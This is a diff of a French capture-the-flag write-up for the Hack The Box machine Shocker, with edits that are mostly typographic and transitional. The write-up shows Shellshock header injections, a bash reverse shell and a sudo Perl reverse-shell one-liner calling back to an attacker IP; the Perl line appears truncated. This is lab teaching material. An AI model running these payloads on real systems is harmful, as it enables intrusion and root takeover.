@@ -38,7 +38,7 @@ ctf:
   skills: ["Enumeration","Web","Privilege Escalation"]
   time_spent: "2h"
   # vpn_ip: "10.10.14.xx"
-  # notes: "Points d'attention…"
+  # notes: "Points d’attention…"
 
 # --- Options diverses ---
 # weight: 10
@@ -47,8 +47,8 @@ ctf:
 ---
 
 <!-- ====================================================================
-Tableau d'infos (modèle) — Remplacer les valeurs entre <...> après création.
-Aucun templating Hugo dans le corps, pour éviter les erreurs d'archetype.
+Tableau d’infos (modèle) — Remplacer les valeurs entre <...> après création.
+Aucun templating Hugo dans le corps, pour éviter les erreurs d’archetype.
 ====================================================================
 | Champ          | Valeur |
 |----------------|--------|
@@ -63,14 +63,14 @@ Aucun templating Hugo dans le corps, pour éviter les erreurs d'archetype.
 -->
 ## Introduction
 
-Dans ce writeup, nous allons explorer la machine **Shocker**, une box emblématique d'HTB illustrant l'exploitation de la vulnérabilité **Shellshock** au travers d'un script CGI exposé dans le répertoire `/cgi-bin/`. Au terme d'une énumération méthodique qui nous permet d'identifier le vecteur d'attaque, l'exploitation du script `user.sh` nous offre un premier accès au système sous l'utilisateur *shelly*. Nous poursuivons ensuite notre progression vers une **élévation de privilèges** en tirant parti d'un binaire Perl exécutable en tant que root sans mot de passe via `sudo`.
- **Ce parcours met en évidence l'importance d'une énumération rigoureuse suivie d'une exploitation ciblée et maîtrisée.**
+Dans ce writeup, nous allons explorer la machine **Shocker**, une box emblématique d’HTB illustrant l’exploitation de la vulnérabilité **Shellshock** au travers d’un script CGI exposé dans le répertoire `/cgi-bin/`. Au terme d’une énumération méthodique qui nous permet d’identifier le vecteur d’attaque, l’exploitation du script `user.sh` nous offre un premier accès au système sous l’utilisateur *shelly*. Nous poursuivons ensuite notre progression vers une **élévation de privilèges** en tirant parti d’un binaire Perl exécutable en tant que root sans mot de passe via `sudo`.
+ **Ce parcours met en évidence l’importance d’une énumération rigoureuse suivie d’une exploitation ciblée et maîtrisée.**
 
 ---
 
 ## Énumération
 
-Pour démarrer, lançons mon script d'énumération {{< script "mon-nouveau-nmap" >}} :
+Pour démarrer, je lance mon script d'énumération {{< script "mon-nouveau-nmap" >}} :
 
 ```bash
 mon-nouveau-nmap target.htb
@@ -98,6 +98,8 @@ PORT     STATE SERVICE
 
 # Nmap done at Fri Nov 21 16:15:11 2025 -- 1 IP address (1 host up) scanned in 7.47 seconds
 ```
+
+N’ayant identifié que deux ports ouverts (80 et 2222), nous poursuivons logiquement avec un scan agressif afin d’obtenir davantage de détails sur les services exposés.
 
 ### Scan agressif
 
@@ -135,6 +137,8 @@ OS and Service detection performed. Please report any incorrect results at https
 # Nmap done at Fri Nov 21 16:15:19 2025 -- 1 IP address (1 host up) scanned in 8.41 seconds
 
 ```
+
+Le port 2222 ne présentant aucun intérêt immédiat, seul le port 80 reste à analyser ; nous poursuivons donc avec une énumération web ciblée à l’aide de mon script {{< script "mon-recoweb" >}}.
 
 ### Scan ciblé CMS
 
@@ -221,7 +225,7 @@ PORT      STATE         SERVICE
 
 
 ### Scan des répertoires
-Pour la partie découverte de chemins web, j'utilise donc mon script dédié {{< script "mon-recoweb" >}}
+Pour la partie découverte de chemins web, j’utilise donc mon script dédié {{< script "mon-recoweb" >}}
 
 ```bash
 mon-recoweb shocker.htb --strict
@@ -310,6 +314,10 @@ Port 80 (http)
  
 ```
 
+**La mise en évidence du répertoire `/cgi-bin/` constitue un indicateur fort : il s’agit de l’emplacement classique des scripts exécutés via le moteur CGI d’Apache, un contexte propice à l’apparition de vulnérabilités historiques comme Shellshock**. 
+
+Cette découverte mérite un examen plus approfondi du contenu du répertoire ainsi qu’un fuzzing ciblé des scripts qu’il expose.
+
 ### Scan des vhosts
 
 Enfin, je teste rapidement la présence de vhosts  avec  {{< script "mon-subdomains" >}}
@@ -374,17 +382,17 @@ Port 80 (http)
                                                                      
 ```
 
-{{< script "mon-recoweb" >}} n'a révélé aucun vhost exploitable, ce qui confirme que l'analyse doit se concentrer sur le port 80 et ses endpoints.
+{{< script "mon-recoweb" >}} n’a révélé aucun vhost exploitable, ce qui confirme que l’analyse doit se concentrer sur le port 80 et ses endpoints.
 
 ## Exploitation – Prise pied (Foothold)
 
 ### Analyse de l'image
 
-Le site web exposé par la machine est extrêmement minimaliste : il ne présente qu'une unique page contenant simplement une image, *bug.jpg*, sans aucun lien ni fonctionnalité apparente. Face à une surface d'attaque aussi restreinte, il est logique d'envisager que cette image puisse dissimuler une information utile à la progression. 
+Le site web exposé par la machine est extrêmement minimaliste : il ne présente qu’une unique page contenant simplement une image, *bug.jpg*, sans aucun lien ni fonctionnalité apparente. Face à une surface d’attaque aussi restreinte, il est logique d’envisager que cette image puisse dissimuler une information utile à la progression. 
 
-Nous commençons donc par la télécharger et l'analyser à l'aide des outils et méthodes décrits dans la recette **{{< recette "Outils-Stéganographie" >}}**, afin de vérifier si elle ne renferme pas un fichier embarqué, des métadonnées révélatrices ou un indice spécifique.
+Nous commençons donc par la télécharger et l’analyser à l’aide des outils et méthodes décrits dans la recette **{{< recette "Outils-Stéganographie" >}}**, afin de vérifier si elle ne renferme pas un fichier embarqué, des métadonnées révélatrices ou un indice spécifique.
 
-Après avoir appliqué une série de ces techniques en commençant par **stegseek** , nous ne mettons en évidence aucun élément utile, ce qui confirme que **l'image ne constitue pas un vecteur d'exploitation** dans ce cas.
+Après avoir appliqué une série de ces techniques (**stegseek**, binwalk, strings, exiftool, steghide…), nous ne mettons en évidence aucun élément utile, ce qui confirme que **l’image ne constitue pas un vecteur d’exploitation** dans ce cas.
 
 
 
@@ -392,11 +400,7 @@ Après avoir appliqué une série de ces techniques en commençant par **stegsee
 
 ### Scan du /cgi-bin/
 
-**La mise en évidence du répertoire `/cgi-bin/` constitue un indicateur fort : il s'agit de l'emplacement classique des scripts exécutés via le moteur CGI d'Apache, un contexte propice à l'apparition de vulnérabilités historiques comme Shellshock**. 
-
-Conformément à ce que suggérait l'énumération, nous concentrons maintenant notre attention sur le répertoire `/cgi-bin/`, point d'entrée potentiel pour l'exploitation.
-
-
+Conformément à ce que suggérait l’énumération, nous concentrons maintenant notre attention sur le répertoire `/cgi-bin/`, point d’entrée potentiel pour l’exploitation.
 
 
 ```bash
@@ -494,7 +498,7 @@ La présence du script `user.sh` dans `/cgi-bin/` évoque immédiatement une pos
 
 ### Shellshock
 
-Nous commençons par injecter dans l'en-tête *User-Agent* une définition de fonction suivie d'une commande (`echo VULN`), conformément au [mécanisme d'exploitation de Shellshock](https://metalkey.github.io/shellshock-explained--exploitation-tutorial.html). Si le serveur exécute cette commande, cela confirme que le script CGI est vulnérable.
+- Nous commençons par injecter dans l’en-tête *User-Agent* une définition de fonction suivie d’une commande (`echo VULN`), conformément au mécanisme d’exploitation de Shellshock. Si le serveur exécute cette commande, cela confirme que le script CGI est vulnérable.
 
 ```bash
 curl -H 'User-Agent: () { :; }; echo; echo VULN' http://shocker.htb/cgi-bin/user.sh
@@ -506,7 +510,7 @@ Just an uptime test script
 
 ```
 
-Pour renforcer la vérification, nous remplaçons la commande précédente par `/usr/bin/id`. L'exécution de cette commande permet de confirmer l'exploitation Shellshock et d'identifier le contexte utilisateur dans lequel le script CGI s'exécute.
+- Pour renforcer la vérification, nous remplaçons la commande précédente par `/usr/bin/id`. L’exécution de cette commande permet de confirmer l’exploitation Shellshock et d’identifier le contexte utilisateur dans lequel le script CGI s’exécute.
 
 ```bash
 curl -H 'User-Agent: () { :; }; echo; /usr/bin/id' http://shocker.htb/cgi-bin/user.sh 
@@ -514,7 +518,7 @@ uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),4
 
 ```
 
-La vulnérabilité étant confirmée, nous injectons un [payload Bash](https://www.revshells.com/) de reverse shell dans l'en-tête *User-Agent*. Celui-ci est exécuté via Shellshock et ouvre immédiatement une session distante sur notre Kali Linux.
+- La vulnérabilité étant confirmée, nous injectons un [payload Bash](https://www.revshells.com/) de reverse shell dans l’en-tête *User-Agent*. Celui-ci est exécuté via Shellshock et ouvre immédiatement une session distante sur notre Kali Linux.
 
 ```bash
 curl -H 'User-Agent: () { :; }; /bin/bash -c "bash -i >& /dev/tcp/10.10.14.152/4444 0>&1"' http://shocker.htb/cgi-bin/user.sh
@@ -591,7 +595,7 @@ shelly@Shocker:/home/shelly$
 
 ### sudo perl
 
-Puisque notre utilisateur `shelly` peut exécuter des commandes perl avec des droits de root, on va exécuter un [payload bash en perl](https://www.revshells.com/)  via `sudo perl`
+Commençons par exécuter un [payload bash en perl](https://www.revshells.com/)  via `sudo perl`
 
 ```bash
 shelly@Shocker:/home/shelly$ sudo perl -e 'use Socket;$i="10.10.14.152";$p=12345;socket(S,PF_INET,SOCK_STREAM,getprotob;if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
@@ -606,9 +610,9 @@ Connection received on 10.129.160.126 34840
 root@Shocker:/home/shelly# 
 ```
 
-Nous obtenons un shell bash root que nous pouvons stabiliser avec {{< recette "stabiliser-reverse-shell" >}}
+Nous obtenons un shell bash que nous pouvons stabiliser avec {{< recette "stabiliser-reverse-shell" >}}
 
-Et puisque nous sommes root, allons à l'essentiel et affichons le `flag root.txt`
+Et puisque nous sommes root, nous pouvons aller à l'essentiel et afficher le `flag root.txt`
 
 ```bash
 root@Shocker:/home/shelly# cat /root/root.txt
@@ -623,11 +627,11 @@ be89xxxxxxxxxxxxxxxxxxxxxxxxxx9bef
 
 ## Conclusion
 
-Cette machine illustre parfaitement l'importance d'une énumération structurée et d'une interprétation attentive des indices laissés en surface. 
+Cette machine illustre parfaitement l’importance d’une énumération structurée et d’une interprétation attentive des indices laissés en surface. 
 
-À partir d'une interface web quasi inexistante, la découverte du répertoire `/cgi-bin/` a orienté notre analyse vers une piste classique mais toujours pertinente : **les scripts CGI vulnérables à Shellshock**. 
+À partir d’une interface web quasi inexistante, la découverte du répertoire `/cgi-bin/` a orienté notre analyse vers une piste classique mais toujours pertinente : **les scripts CGI vulnérables à Shellshock**. 
 
-L'exploitation progressive — validation de la faille, exécution de commandes, puis obtention d'un reverse shell — nous a permis d'obtenir un accès utilisateur avant de finaliser l'attaque par une élévation de privilèges simple et directe via `sudo` et Perl.
+L’exploitation progressive — validation de la faille, exécution de commandes, puis obtention d’un reverse shell — nous a permis d’obtenir un accès utilisateur avant de finaliser l’attaque par une élévation de privilèges simple et directe via `sudo` et Perl.
 
-**Un déroulé simple et cohérent, qui montre qu'une vulnérabilité historique comme Shellshock peut rester exploitable lorsqu'elle n'est pas corrigée.**.
+**Un déroulé simple et cohérent, qui montre qu’une vulnérabilité historique comme Shellshock peut rester exploitable lorsqu’elle n’est pas corrigée.**.
 
